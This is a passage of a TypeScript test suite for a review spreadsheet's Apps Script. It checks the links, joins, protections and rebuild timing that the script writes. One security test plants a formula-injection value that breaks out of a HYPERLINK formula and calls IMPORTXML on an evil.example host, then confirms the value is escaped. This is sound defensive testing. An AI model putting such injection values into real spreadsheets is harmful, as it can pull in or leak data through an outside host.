/**
 * The review sheet's Apps Script, run outside Google: the built Code.gs is
 * evaluated against a small fake of the Apps Script services it calls, over a
 * three-tab sheet, and the links and joins it writes are checked.
 *
 * Skill: `review-sheet-script`. What this proves is that the template and the
 * builder agree and the script writes what the skill says it writes. It does
 * not prove the sheet is installed or current; the skill's "How to tell it
 * works" covers that.
 */
import { describe, expect, test } from "bun:test";
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { buildConfig, buildScript, chunks, CODE_GS_URL, configRows, readable, tabInstructions, tocRows } from "./build-review-sheet-script.js";
import { readFileSync as readText } from "node:fs";
import { feedbackBasis, hashOf } from "./feedback-issue.js";

const code = buildScript();
const withConfig = <T extends object>(t: T, rows: string[][]) => ({ ...t, Config: { id: 50, rows } });

type Prot = { col: string; from?: number; desc: string; editors: string[]; removed: boolean; api?: { getDescription(): string; remove(): void } };
type Rich = { text: string; links: [number, number, string][]; bold: [number, number][] };

/** A fake folio: a draft with printed pages 1–3 on PDF pages 12–14 (offset 11). */
function folio(tabs?: Record<string, string>): string {
  const repo = mkdtempSync(join(tmpdir(), "review-sheet-"));
  mkdirSync(join(repo, "review/public-comment"), { recursive: true });
  writeFileSync(join(repo, "anchors.json"), JSON.stringify({
    chapters: [{ dir: "ch1", title: "Introduction", number: 1 }],
    sections: [{ label: "sec:1-2", number: "1.2", title: "Scope", page: 13 }],
    blocks: [
      { page: 12, printedPage: "1", sections: ["sec:ch1-lead"] },
      { page: 13, printedPage: "2", sections: ["sec:ch1-lead", "sec:1-2"] },
    ],
  }));
  writeFileSync(join(repo, "lines.json"), JSON.stringify({
    pages: {
      "12": { printed: "1", lines: { "1": "one", "2": "two" } },
      "13": { printed: "2", lines: { "3": "three", "4": "four" } },
      "14": { printed: "3", lines: { "5": "five" } },
    },
  }));
  writeFileSync(join(repo, "review/public-comment/sheet-sync.json"), JSON.stringify({
    anchors: "anchors.json",
    lineMap: "lines.json",
    draftUrl: "https://x.example/D#page=",
    commentUrl: "https://x.example/C#",
    ...(tabs ? { tabs } : {}),
  }));
  return repo;
}

/** A fake of the Apps Script services the script calls, over tabs of strings. */
function runtime(tabs: Record<string, { id: number; rows: string[][] }>) {
  const written: Record<string, Record<string, unknown[][]>> = {};
  const props: Record<string, string> = {};
  const toasts: string[] = [];
  // A write lands at its rows: a whole column is the array of its rows from
  // row 2; a one-row write fills only its place.
  // A legend row ("Instructions", or the older "Colour key") above the header moves the data down.
  const hdr = (name: string) => {
    let h = 0;
    while (h < tabs[name].rows.length - 1 && /^(instructions|colou?r key)/i.test(tabs[name].rows[h][0])) h++;
    return h;
  };
  const put = (name: string, h: string, r: number, v: unknown[][]) => {
    const tab = (written[name] ??= {});
    const top = hdr(name) + 2;
    if (r === 1 || (r === top && v.length > 1)) return void (tab[h] = v);
    const arr = (tab[h] ??= []);
    v.forEach((x, i) => (arr[r - top + i] = x));
  };
  const sheet = (name: string) => {
    const t = tabs[name];
    return {
      hideSheet: () => ((t as { hidden?: boolean }).hidden = true),
      getName: () => name,
      getSheetId: () => t.id,
      getLastRow: () => t.rows.length,
      getLastColumn: () => t.rows[0].length,
      getMaxRows: () => 500,
      getProtections: () => ((t as { prot?: Prot[] }).prot ??= []).filter((p) => !p.removed).map((p) => p.api!),
      getRange: (r: number, c: number, nr: number, nc: number) => ({
        protect: () => {
          const p: Prot = { col: t.rows[hdr(name)][c - 1], from: r, desc: "", editors: ["owner@x.example"], removed: false };
          ((t as { prot?: Prot[] }).prot ??= []).push(p);
          const api = {
            setDescription: (d: string) => ((p.desc = d), api),
            getDescription: () => p.desc,
            getEditors: () => p.editors.slice(),
            removeEditors: (es: string[]) => ((p.editors = p.editors.filter((e) => e === "owner@x.example" || !es.includes(e))), api),
            addEditors: (es: string[]) => ((p.editors = [...new Set([...p.editors, ...es])]), api),
            remove: () => { p.removed = true; },
          };
          p.api = api;
          return api;
        },
        getDisplayValues: () => t.rows.slice(r - 1, r - 1 + nr).map((row) => row.slice(c - 1, c - 1 + nc)),
        setValues: (v: unknown[][]) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, v),
        setRichTextValues: (v: unknown[][]) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, v),
        clearContent: () => {},
        setBackground(bg: string) { ((t as { bg?: Record<number, string> }).bg ??= {})[r] = bg; return this; },
        setVerticalAlignment() { return this; },
        setFontWeight() { return this; },
      }),
    };
  };
  const builder = () => {
    const r: Rich = { text: "", links: [], bold: [] };
    const b = {
      setText: (s: string) => ((r.text = s), b),
      setLinkUrl: (a: number, z: number, u: string) => (r.links.push([a, z, u]), b),
      setTextStyle: (a: number, z: number) => (r.bold.push([a, z]), b),
      build: () => r,
    };
    return b;
  };
  const g = {
    SpreadsheetApp: {
      getActive: () => ({
        getId: () => "copy-sheet-id",
        toast: (msg: string) => toasts.push(msg),
        getSheetByName: (n: string) => (tabs[n] ? sheet(n) : null),
        insertSheet: (n: string) => ((tabs[n] = { id: 99, rows: [["Section", "Link"]] }), sheet(n)),
      }),
      newRichTextValue: builder,
      ProtectionType: { RANGE: "RANGE" },
      newTextStyle: () => ({ setBold: () => ({ build: () => ({ bold: true }) }) }),
    },
    LockService: { getDocumentLock: () => ({ tryLock: () => true, releaseLock: () => {} }) },
    PropertiesService: {
      getDocumentProperties: () => ({
        getProperty: (k: string) => props[k] ?? null,
        setProperty: (k: string, v: string) => (props[k] = v),
        deleteProperty: (k: string) => delete props[k],
      }),
    },
  };
  return { g, written, props, sheet, toasts };
}

function load(code: string, g: Record<string, unknown>) {
  const fn = new Function(...Object.keys(g), `${code}\nreturn { refreshAll, markDirty, refreshIfDirty };`);
  return fn(...Object.values(g)) as { refreshAll(): void; markDirty(e: unknown): void; refreshIfDirty(): void };
}

const tabs = () => ({
  "Review Public Comments": {
    id: 1,
    rows: [
      ["No.", "Sections", "Page", "Line no(s) / Table / Figure", "Comment / issue", "Suggested revision", "Committee Feedback (initials)", "Disposition", "Status", "Agentic status"],
      ["1", "1.2 and Chapter 1", "2", "p.2 line 3", "Too short", "Lengthen it", "AB agrees", "", "Pending", ""],
      ["2", "nowhere", "3", "L 5", "Typo", "", "", "Accepted", "", ""],
      ["3", "", "", "", "Off topic", "", "", "", "", ""],
    ],
  },
  "Agent - Comments": {
    id: 2,
    rows: [
      ["No.", "Comment ref", "Agentic status", "Change-sets"],
      ["1", "PC-0002", "PR open", "CS-001"],
      ["2", "PC-0003", "PR open", "CS-001"],
      ["3", "PC-0004", "Not started", "CS-002"],
    ],
  },
  "Agent - Change Sets": {
    id: 4,
    rows: [
      ["Change-set", "Title", "Pull request (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)"],
      ["CS-001", "Fix scope", "https://github.com/o/r/pull/97\nhttps://github.com/o/r/pull/130", "Adds the scope\nFixes a typo", "2026-10-30 22:30Z"],
      ["CS-002", "Other", "", "", ""],
    ],
  },
  "Review Change Sets": {
    id: 3,
    rows: [
      ["Change-set", "Sections", "Pages", "Public Comments", "Suggested Revisions", "PC Committee Feedback", "Dispositions", "Agentic status"],
      ["CS-001", "", "", "", "", "", "", ""],
      ["CS-002", "", "", "", "", "", "", ""],
    ],
  },
});

const pcTabs = tabs;
const slice = (r: Rich, [a, z]: [number, number, ...unknown[]]) => r.text.slice(a, z);

describe("review-sheet.gs, built and run against a fake sheet", () => {
  const pcRows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
  const rt = runtime(withConfig(tabs(), pcRows));
  load(code, rt.g).refreshAll();
  const rpc = rt.written["Review Public Comments"];
  const rcs = rt.written["Review Change Sets"];

  test("the built script has no template placeholder left", () => {
    expect(code).not.toContain("/*@@CONFIG@@*/");
    expect(code).not.toContain("@@STAMP@@");
    // A sheet can say which build it runs, and where the latest is (owner, 2026-10-31).
    expect(code).toMatch(/const SCRIPT_VERSION = '(\S+|template sha256 [0-9a-f]{16}|[0-9a-f]{40}.*)';/);
    expect(code).toContain("'Which version is this?', 'showVersion'");
    expect(code).toContain("@OnlyCurrentDoc");
    expect(code).toMatch(/at ([0-9a-f]{40}|unknown)/);
    expect(code).not.toMatch(/UrlFetchApp|MailApp|GmailApp|DriveApp/);
  });

  test("RPC No. links to the comment's page, and stays a number", () => {
    expect(rpc["No."]).toEqual([['=HYPERLINK("https://x.example/C#PC-0002",1)'], ['=HYPERLINK("https://x.example/C#PC-0003",2)'], ['=HYPERLINK("https://x.example/C#PC-0004",3)']]);
  });

  test("RPC Sections link each section and chapter to its first PDF page", () => {
    const r = rpc.Sections[0][0] as Rich;
    expect(r.links.map((l) => [slice(r, l), l[2]])).toEqual([["1.2", "https://x.example/D#page=13"], ["Chapter 1", "https://x.example/D#page=12"]]);
    expect((rpc.Sections[1][0] as Rich).links).toEqual([]);
  });

  test("RPC Page links printed pages at the printed-to-PDF offset", () => {
    expect((rpc.Page[0][0] as Rich).links).toEqual([[0, 1, "https://x.example/D#page=13"]]);
    expect((rpc.Page[1][0] as Rich).links).toEqual([[0, 1, "https://x.example/D#page=14"]]);
  });

  test("RPC lines go to the page that holds them", () => {
    const r = rpc["Line no(s) / Table / Figure"][0][0] as Rich;
    expect(r.links.map((l) => [slice(r, l), l[2]])).toEqual([["p.2", "https://x.example/D#page=13"], ["line 3", "https://x.example/D#page=13"]]);
    const r2 = rpc["Line no(s) / Table / Figure"][1][0] as Rich;
    expect(r2.links.map((l) => [slice(r2, l), l[2]])).toEqual([["L 5", "https://x.example/D#page=14"]]);
  });

  test("RCS joins its comments, each No. n linking to its RPC row, status bold", () => {
    const c = rcs["Public Comments"][0][0] as Rich;
    expect(c.text).toBe("No. 1 (Pending) · Too short\n\nNo. 2 · Typo");
    expect(c.links.map((l) => [slice(c, l), l[2]])).toEqual([["No. 1", "#gid=1&range=A2"], ["No. 2", "#gid=1&range=A3"]]);
    expect(c.bold.map(([a, z]) => c.text.slice(a, z))).toEqual(["(Pending)"]);
    expect((rcs["Suggested Revisions"][0][0] as Rich).text).toBe("No. 1 · Lengthen it");
    expect((rcs["PC Committee Feedback"][0][0] as Rich).text).toBe("No. 1 · AB agrees");
    expect((rcs.Dispositions[0][0] as Rich).text).toBe("No. 2 · Accepted");
  });

  test("RCS Sections and Pages are the union over its comments, linked", () => {
    const s = rcs.Sections[0][0] as Rich;
    expect(s.text).toBe("1, 1.2, nowhere");
    expect(s.links.map((l) => l[2])).toEqual(["https://x.example/D#page=12", "https://x.example/D#page=13"]);
    const p = rcs.Pages[0][0] as Rich;
    expect(p.text).toBe("2–3");
    expect(p.links).toEqual([[0, 3, "https://x.example/D#page=13"]]);
  });

  test("Agentic status, on both tabs, is each PR linked, its status and completion time bold, and what it changed", () => {
    for (const cell of [rcs["Agentic status"][0][0], rpc["Agentic status"][0][0]] as Rich[]) {
      expect(cell.text).toBe("r#97 (PR open, 2026-10-30 22:30Z) · Adds the scope\nr#130 (PR open) · Fixes a typo");
      expect(cell.links.map((l) => [slice(cell, l), l[2]])).toEqual([
        ["r#97", "https://github.com/o/r/pull/97"],
        ["r#130", "https://github.com/o/r/pull/130"],
      ]);
      expect(cell.bold.map(([a, z]) => cell.text.slice(a, z))).toEqual(["(PR open, 2026-10-30 22:30Z)", "(PR open)"]);
    }
  });

  test("with no PR, Agentic status is the status alone", () => {
    expect((rcs["Agentic status"][1][0] as Rich).text).toBe("Not started");
    expect((rpc["Agentic status"][2][0] as Rich)).toEqual({ text: "Not started", links: [], bold: [] });
  });

  test("security: a quote in No. cannot break out of the HYPERLINK formula", () => {
    const t = tabs();
    t["Review Public Comments"].rows[1][0] = 'x",IMPORTXML("https://evil.example","//a"),"';
    t["Agent - Comments"].rows[1][0] = t["Review Public Comments"].rows[1][0];
    const rt2 = runtime(withConfig(t, pcRows));
    load(code, rt2.g).refreshAll();
    const f = rt2.written["Review Public Comments"]["No."][0][0] as string;
    expect(f).toBe('=HYPERLINK("https://x.example/C#PC-0002","x"",IMPORTXML(""https://evil.example"",""//a""),""")');
  });

  test("a Config written with the old short DATA names (K, ABBR, LP, OFFSET, MAX) still works", () => {
    const d = JSON.parse(pcRows.filter((r) => r[0] === "DATA").map((r) => r[1].slice(1)).join(""));
    const old = { K: d.SECTIONS, ABBR: d.ABBREVIATIONS, LP: d.PAGE_LINES, OFFSET: d.PAGE_OFFSET, MAX: d.LAST_PAGE };
    const rows = pcRows.filter((r) => r[0] !== "DATA").concat([["DATA", "|" + JSON.stringify(old)]]);
    const a = runtime(withConfig(tabs(), pcRows));
    const b = runtime(withConfig(tabs(), rows));
    load(code, a.g).refreshAll();
    load(code, b.g).refreshAll();
    expect(JSON.stringify(b.written)).toBe(JSON.stringify(a.written));
  });

  test("Agentic status (filter) holds one plain status per change set, for a filter view", () => {
    const t = tabs();
    t["Review Change Sets"].rows[0].push("Agentic status (filter)");
    t["Review Change Sets"].rows.slice(1).forEach((r) => r.push(""));
    t["Agent - Comments"].rows[2][2] = "Needs human";
    const rt2 = runtime(withConfig(t, pcRows));
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Review Change Sets"]["Agentic status (filter)"]).toEqual([["Needs human"], ["Not started"]]);
  });

  test("a Colour key row above RPC's and RCS's headers changes nothing the script writes", () => {
    const keyed = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    for (const n of ["Review Public Comments", "Review Change Sets"]) {
      const r = keyed[n].rows;
      r.unshift(["Colour key: Grey = mechanical", ...r[0].slice(1).map(() => "")]);
    }
    const b = runtime(keyed);
    load(code, b.g).refreshAll();
    expect(b.written["Review Public Comments"]).toEqual(rpc);
    const rcsB = b.written["Review Change Sets"], rcsA = rt.written["Review Change Sets"];
    // Links from RCS to an RPC row point one row lower.
    expect(JSON.stringify(rcsB)).toBe(JSON.stringify(rcsA).replace(/range=A(\d+)/g, (_, n) => "range=A" + (+n + 1)));
  });

  test("a sheet still headed Architect Feedback (the name before 2026-10-31) works the same", () => {
    const old = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    for (const n of ["Review Public Comments", "Review Change Sets"])
      old[n].rows[0] = old[n].rows[0].map((h) => h.replace("Committee Feedback", "Architect Feedback"));
    const b = runtime(old);
    load(code, b.g).refreshAll();
    expect((b.written["Review Change Sets"]["PC Architect Feedback"][0][0] as Rich).text).toBe("No. 1 · AB agrees");
  });

  test("renaming Architect Feedback to Committee Feedback marks no proposal stale", () => {
    const oldHdr = ["Change-set", "Title", "TWG (CS)", "Architect Feedback (CL)", "Architect Feedback (agent)", "Ready for agent"];
    const row = ["CS-001", "Fix scope", "TWG 1", "do it", "Proposal", "Yes"];
    const basis = feedbackBasis(oldHdr, row, ["Title", "TWG (CS)"], "Architect Feedback");
    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    t["Review Change Sets"].rows = [oldHdr.map((h) => h.replace("Architect", "Committee")), row];
    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
    t["Agent - Change Sets"].rows[1].push(basis);
    const run = () => { const b = runtime(t); load(code, b.g).refreshAll(); return b.written["Review Change Sets"] ?? {}; };
    expect(run()["Committee Feedback (agent)"]).toBeUndefined();
    expect(run()["Ready for agent"]).toBeUndefined();
    // Control: a real change is still caught under the new name.
    row[3] = "do it differently";
    const w = run();
    expect(String(w["Committee Feedback (agent)"][0][0])).toMatch(/^\u26a0 Stale: /);
    expect(w["Ready for agent"][0][0]).toBe("No");
  });

  test("a sheet with both agent tables on one Agent tab, as before 2026-10-31, works the same", () => {
    const oneRows = configRows(buildConfig(folio({ AGENT: "Agent", AGENT_CS: "" }), "review/public-comment/sheet-sync.json"));
    const t = withConfig(tabs(), oneRows) as Record<string, { id: number; rows: string[][] }>;
    const c = t["Agent - Comments"].rows, cs = t["Agent - Change Sets"].rows;
    t.Agent = { id: 2, rows: c.map((r, i) => [...r, ...(cs[i] ?? cs[0].map(() => ""))]) };
    delete t["Agent - Comments"];
    delete t["Agent - Change Sets"];
    const b = runtime(t);
    load(code, b.g).refreshAll();
    expect(b.written["Review Change Sets"]).toEqual(rcs);
    expect(b.written["Review Public Comments"]).toEqual(rpc);
  });

  test("an edit rebuilds at once while a rebuild is quick", () => {
    const rt2 = runtime(withConfig(tabs(), pcRows));
    load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Agent - Comments") } });
    expect(rt2.props.dirty).toBeUndefined();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
  });

  test("once a rebuild is slow, an edit marks the sheet dirty, and the timer rebuilds once", () => {
    const rt2 = runtime(withConfig(tabs(), pcRows));
    rt2.props.lastMs = "20000";
    const s = load(code, rt2.g);
    s.markDirty({ range: { getSheet: () => rt2.sheet("Public Comment Source") } });
    expect(rt2.props.dirty).toBeUndefined();
    s.markDirty({ range: { getSheet: () => rt2.sheet("Agent - Comments") } });
    expect(rt2.props.dirty).toBe("1");
    s.refreshIfDirty();
    expect(rt2.props.dirty).toBeUndefined();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
  });

  test("the agent's API writes to Agent fire no edit, so the timer rebuilds when Agent changed, and only then", () => {
    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshIfDirty();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
    delete rt2.written["Review Change Sets"];
    s.refreshIfDirty();
    expect(rt2.written["Review Change Sets"]).toBeUndefined();
    t["Agent - Comments"].rows[3][2] = "PR open";
    s.refreshIfDirty();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
  });
});

/** A fake drafting folio: two chapters, one numbered section, one with a comma. */
function draftFolio(): string {
  const repo = mkdtempSync(join(tmpdir(), "review-sheet-draft-"));
  mkdirSync(join(repo, "review/drafting"), { recursive: true });
  writeFileSync(join(repo, "anchors.json"), JSON.stringify({
    chapters: [
      { dir: "about", title: "About this draft" },
      { dir: "ch01-why", title: "Chapter 1. Why it matters", number: 1 },
      { dir: "ch12-privacy", title: "Chapter 12. Privacy, Security and Trust", number: 12 },
    ],
    sections: [
      { label: "sec:about-lead", title: "About this draft", chapter: "about" },
      { label: "sec:about-questions", title: "Questions for the TWG", chapter: "about" },
      { label: "sec:ch01-lead", title: "Objectives and key messages", chapter: "ch01-why" },
      { label: "sec:1-1", number: "1.1", title: "1.1 Global challenges", chapter: "ch01-why" },
    ],
    blocks: [],
  }));
  writeFileSync(join(repo, "review/drafting/sheet-sync.json"), JSON.stringify({
    mode: "drafting",
    anchors: "anchors.json",
    sectionUrl: "https://x.example/S#",
  }));
  return repo;
}

const draftTabs = () => ({
  "Contributor Feedback": {
    id: 1,
    rows: [
      ["Change-set", "Title", "Selected Sections", "Section links", "Contributor Feedback (CL)", "Contributor Feedback (initials/name)", "Issue", "Agentic status", "Staging review"],
      ["CS-004", "Define registry", "Ch 1 Why it matters,\u2800\u2800\u28001.1 Global challenges", "", "AB: needs a definition", "", "", "", ""],
      ["", "Privacy wording", "Ch 12 Privacy; Security and Trust, Somewhere else, 1.1 Global challenges", "", "", "CD: tighten", "", "", ""],
      ["", "", "", "", "", "", "", "", ""],
    ],
  },
  Agent: {
    id: 2,
    rows: [
      ["Change-set", "Issue", "Agentic status", "Pull request (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)", "Staging review page (change set)"],
      ["CS-004", "https://github.com/o/dth/issues/12", "PR open", "https://github.com/o/dth/pull/40", "Adds the definition", "2026-10-30 23:40Z", "https://o.github.io/dth/STAGING/cs-004/en/review/"],
    ],
  },
});

describe("review-sheet.gs in drafting mode", () => {
  const dRows = configRows(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"));
  const tabs = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][]; hidden?: boolean }>;
  const rt = runtime(tabs);
  load(code, rt.g).refreshAll();
  const fb = rt.written["Contributor Feedback"];

  test("in a sheet without its tabs it stops with a plain message", () => {
    const rt2 = runtime(withConfig({ "Review Public Comments": { id: 1, rows: [["No."]] } }, dRows) as never);
    expect(() => load(code, rt2.g).refreshAll()).toThrow(/written from review\/drafting\/sheet-sync.json for a drafting sheet.*no "Contributor Feedback"/);
  });

  test("without a Config tab it says so", () => {
    const rt2 = runtime(draftTabs() as never);
    expect(() => load(code, rt2.g).refreshAll()).toThrow(/no "Config" tab/);
  });

  test("each tab's Instructions say how that tab works, in the sheet's own words, and the Config tab's are short rows", () => {
    expect(dRows.slice(0, 5).map((r) => r[0])).toEqual(["Instructions", "Instructions - Install script", "Instructions - Dropdown", "Instructions - Editors", "Key"]);
    expect(dRows[0][1]).toContain("only the owner edits");
    // Installing Code.gs, step by step, with the project named after the sheet (owner, 2026-10-31).
    expect(dRows[1][1]).toMatch(/Extensions, then Apps Script[\s\S]*Name the project after this spreadsheet[\s\S]*installTriggers[\s\S]*Advanced/);
    expect(dRows[1][1]).toContain("Google hasn't verified this app. The app is requesting access to sensitive info in your Google Account.");
    expect(dRows[1][1]).toContain("https://support.google.com/cloud/answer/7454865");
    expect(dRows[2][1]).toContain("Allow multiple selections");
    expect(dRows[3][1]).toContain("EDITORS");
    expect(dRows[3][1]).toMatch(/Format: plain emails[\s\S]*Example[\s\S]*ana@example\.org\n\s+ben@example\.org/);
    // No Config row is taller than a window.
    expect(Math.max(...dRows.slice(0, 4).map((r) => r[1].split("\n").length))).toBeLessThanOrEqual(10);
    // A public-comment sheet has no dropdown row.
    expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json")).map((r) => r[0])).not.toContain("Instructions - Dropdown");
    const d = tabInstructions(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"));
    const cf = d["Contributor Feedback"];
    expect(cf).toContain("Blue = your input, by the Authoring Committee");
    expect(cf).toContain("Ready for agent (Orange) back to No");
    expect(cf).toContain("Filter views");
    // Colour words are capitalised, so the sheet can bold and colour each one.
    expect(cf).not.toMatch(/\b(blue|green|orange|grey)\b/);
    expect(cf).toContain("/en/cat-harness/processes/contributor-feedback.html");
    const p = tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    expect(p["Review Public Comments"]).toContain("one row per public comment");
    expect(p["Review Change Sets"]).toContain("one row per change set");
    expect(p["Review Change Sets"]).toContain("/en/cat-harness/processes/public-comment.html");
    expect(Object.values(p).join("\n")).not.toMatch(/architect/i);
    expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))[1][1]).not.toContain("Allow multiple selections");
  });

  test("the script is the same for every document: nothing of the folio is in it", () => {
    expect(code).not.toContain("https://x.example/S#");
    expect(code).not.toContain("Global challenges");
    expect(dRows.find((r) => !(/^Instructions/.test(r[0]) || ["Key", "EDITORS"].includes(r[0])))?.[0]).toBe("CFG");
    expect(dRows.filter((r) => ["GUIDE", "SETUP"].includes(r[0]))).toHaveLength(0);
    expect(dRows.find((r) => r[0] === "EDITORS")![1]).toBe("");
    expect(dRows.every((r, i) => /^Instructions|^Key$/.test(r[0]) || r[0] === "EDITORS" || r[1].startsWith("|"))).toBe(true);
    expect(JSON.parse(dRows.find((r) => r[0] === "CFG")![1].slice(1)).MODE).toBe("drafting");
  });

  test("the built script is plain ASCII, so a paste cannot mangle it", () => {
    expect(/[^\x00-\x7f]/.test(code)).toBe(false);
  });

  test("the TOC has chapters and sections, without commas, each with its anchor", () => {
    const toc = rt.written.TOC.Section as string[][];
    expect(toc.map((r) => r[0])).toEqual([
      "Section", "About this draft", "About this draft · Questions for the TWG", "Ch 1 Why it matters",
      "Ch 1 · Objectives and key messages", "1.1 Global challenges", "Ch 12 Privacy; Security and Trust",
    ].map((n) => (/^(Section|About this draft$|Ch \d+ [^·])/.test(n) ? n : `\u2800\u2800\u2800${n}`)));
    expect(toc[4][1]).toBe('=HYPERLINK("https://x.example/S#sec:ch01-lead","open")');
    expect(tabs.TOC.hidden).toBe(true);
  });

  test("a used row without a Change-set gets the next id; an empty row does not", () => {
    expect(fb["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
  });

  test("Section links has each picked section linked, one per line; unknown picks are left out; Sections is not rewritten", () => {
    const r = fb["Section links"][0][0] as Rich;
    expect(r.text).toBe("Ch 1 Why it matters\n1.1 Global challenges");
    expect(r.links.map((l) => [slice(r, l), l[2]])).toEqual([["Ch 1 Why it matters", "https://x.example/S#chap:ch01-why"], ["1.1 Global challenges", "https://x.example/S#sec:1-1"]]);
    const r2 = fb["Section links"][1][0] as Rich;
    // A marked pick ("\u2514 1.1 ...") and a bare one (an old value, or a first chip Sheets trimmed) both link.
    expect(r2.links.map((l) => [slice(r2, l), l[2]])).toEqual([["Ch 12 Privacy; Security and Trust", "https://x.example/S#chap:ch12-privacy"], ["1.1 Global challenges", "https://x.example/S#sec:1-1"]]);
    expect(fb.Sections).toBeUndefined();
  });

  test("Selected Sections is kept valid: a bare pick gets its mark, a gone one is flagged in Section links", () => {
    expect(fb["Selected Sections"][1][0]).toBe("Ch 12 Privacy; Security and Trust, Somewhere else, \u2800\u2800\u28001.1 Global challenges");
    expect((fb["Section links"][1][0] as Rich).text).toBe(
      'Ch 12 Privacy; Security and Trust\n1.1 Global challenges\n\u26a0 "Somewhere else" is not in the document now: pick its section again');
    expect(tabs.TOC.rows.length).toBeGreaterThan(0);
    expect((rt.written.TOC.Section as string[][])[5]).toEqual(["\u2800\u2800\u28001.1 Global challenges", '=HYPERLINK("https://x.example/S#sec:1-1","open")', "sec:1-1"]);
  });

  test("the agent's TOC rows are the ones the script's refresh writes, so a linked copy's dropdown works before the script is pasted", () => {
    const toc = tocRows(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"))!;
    expect(toc).toEqual(rt.written.TOC.Section as string[][]);
    expect(tocRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))).toBeUndefined();
  });

  test("a pick with the old \u2514 mark is rewritten to the indented name", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t["Contributor Feedback"].rows[1][2] = "\u2514\u20021.1 Global challenges";
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Contributor Feedback"]["Selected Sections"][0][0]).toBe("\u2800\u2800\u28001.1 Global challenges");
  });

  test("a pick of a section renamed since follows it, by its anchor", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t.TOC = { id: 9, rows: [["Section", "Link", "Anchor"], ["\u2800\u2800\u28001.1 Old challenges", "open", "sec:1-1"]] };
    t["Contributor Feedback"].rows[1][2] = "\u2800\u2800\u28001.1 Old challenges";
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    const f = rt2.written["Contributor Feedback"];
    expect(f["Selected Sections"][0][0]).toBe("\u2800\u2800\u28001.1 Global challenges");
    expect((f["Section links"][0][0] as Rich).text).toBe("1.1 Global challenges");
  });

  test("EDITORS locks each Ready column to the owner and those emails; empty leaves the owner alone", () => {
    const rows = dRows.map((r) => (r[0] === "EDITORS" ? ["EDITORS", "a@x.example\nb@x.example, not-an-email"] : r));
    const t = withConfig(draftTabs(), rows) as Record<string, { id: number; rows: string[][]; prot?: Prot[] }>;
    const fbRows = t["Contributor Feedback"].rows;
    fbRows[0].push("Ready for agent", "Ready for merge");
    fbRows.forEach((r, i) => i && r.push("", ""));
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    const live = () => (t["Contributor Feedback"].prot ?? []).filter((p) => !p.removed);
    expect(live().map((p) => p.col)).toEqual(["Ready for agent", "Ready for merge"]);
    expect(live()[0].editors).toEqual(["owner@x.example", "a@x.example", "b@x.example"]);
    expect(rt2.toasts.some((m) => /left out: not-an-email/.test(m))).toBe(true);
    load(code, rt2.g).refreshAll();
    expect(live()).toHaveLength(2);
    t.Config.rows = t.Config.rows.map((r) => (r[0] === "EDITORS" ? ["EDITORS", ""] : r));
    load(code, rt2.g).refreshAll();
    expect(live()).toHaveLength(2);
    expect(live()[0].editors).toEqual(["owner@x.example"]);
  });

  test("any filled row gets a Change-set; one holding only No does not", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const fbRows = t["Contributor Feedback"].rows;
    fbRows[0].push("Ready for agent");
    fbRows.forEach((r, i) => i && r.push(""));
    fbRows[3][9] = "No";
    fbRows.push(["", "", "", "", "", "", "", "", "", "Yes"]);
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""], ["CS-006"]]);
  });

  test("an Instructions row above the header changes nothing the script writes, and edits and locks start below it", () => {
    const rows = dRows.map((r) => (r[0] === "EDITORS" ? ["EDITORS", "a@x.example"] : r));
    const plain = withConfig(draftTabs(), rows) as Record<string, { id: number; rows: string[][]; prot?: Prot[] }>;
    const keyed = withConfig(draftTabs(), rows) as Record<string, { id: number; rows: string[][]; prot?: Prot[] }>;
    for (const t of [plain, keyed]) {
      t["Contributor Feedback"].rows[0].push("Ready for agent");
      t["Contributor Feedback"].rows.forEach((r, i) => i && r.push(""));
    }
    const fbRows = keyed["Contributor Feedback"].rows;
    fbRows.unshift(["Instructions", ...fbRows[0].slice(1).map(() => "")]);
    const a = runtime(plain), b = runtime(keyed);
    load(code, a.g).refreshAll();
    load(code, b.g).refreshAll();
    expect(b.written["Contributor Feedback"]).toEqual(a.written["Contributor Feedback"]);
    expect((keyed["Contributor Feedback"].prot ?? []).map((p) => [p.col, p.from])).toEqual([["Ready for agent", 3]]);
    // An edit of the legend or header rebuilds everything; one below them, its row.
    const s = load(code, b.g);
    s.markDirty({ range: { getSheet: () => b.sheet("Contributor Feedback"), getRow: () => 2, getNumRows: () => 1 } });
    expect(b.props.rows ?? "").toBe("");
